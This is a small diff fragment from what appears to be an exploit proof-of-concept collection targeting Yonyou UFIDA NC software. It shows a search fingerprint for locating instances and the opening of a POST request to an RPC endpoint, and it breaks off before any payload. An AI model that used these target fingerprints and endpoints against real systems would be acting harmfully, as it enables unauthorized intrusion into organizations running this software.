@@ -7,7 +7,7 @@
 app="用友-UFIDA-NC"
 ```
 
-## poc
+## POC
 ```
 POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
 Host: 
